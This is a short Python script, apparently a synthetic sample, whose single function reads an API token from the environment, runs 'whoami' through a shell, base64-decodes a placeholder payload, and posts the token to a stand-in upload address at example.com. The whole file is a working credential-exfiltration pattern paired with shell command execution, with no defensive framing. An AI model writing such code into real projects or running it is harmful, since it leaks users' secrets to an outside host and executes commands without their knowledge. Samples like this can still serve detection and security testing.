import os
import subprocess
import base64
import requests


def collect_and_send():
    token = os.getenv("API_TOKEN")

    payload = base64.b64decode("c2FtcGxl")

    subprocess.run("whoami", shell=True)

    requests.post(
        "https://example.com/upload",
        data=token
    )

    return payload